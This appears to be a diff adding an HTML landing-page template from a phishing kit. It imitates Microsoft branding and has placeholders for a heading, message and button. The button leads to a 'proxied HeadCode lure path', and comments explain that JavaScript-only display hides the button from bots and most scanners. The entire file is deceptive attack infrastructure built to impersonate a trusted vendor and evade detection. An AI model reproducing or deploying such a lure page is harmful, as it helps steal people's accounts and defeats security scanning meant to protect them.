@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{PAGE_TITLE}}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            padding: 48px 44px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            width: 108px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 12px;
+        }
+        .message {
+            font-size: 14px;
+            color: #605e5c;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+        .btn {
+            display: inline-block;
+            background: #0078d4;
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 40px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn:hover { background: #106ebe; }
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #a19f9d;
+        }
+        /* Hide from bots: button only works with JS */
+        noscript .btn { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- EDIT: Replace with your own logo URL or base64 -->
+        <img class="logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Logo">
+
+        <!-- EDIT: Main heading -->
+        <h1>{{HEADING}}</h1>
+
+        <!-- EDIT: Body message -->
+        <p class="message">{{MESSAGE}}</p>
+
+        <!-- The button links to the proxied HeadCode lure path -->
+        <a href="{{LURE_PATH}}" class="btn" id="action-btn" style="display:none;">{{BUTTON_TEXT}}</a>
+
+        <noscript>
+            <p style="color:#a4262c;font-size:13px;margin-top:16px;">Please enable JavaScript to continue.</p>
+        </noscript>
+
+        <p class="footer">{{FOOTER}}</p>
+    </div>
+
+    <script>
+        // Only show button if JS is enabled (blocks most scanners)
+        document.getElementById('action-btn').style.display = 'inline-block';
+    </script>
+</body>
+</html>
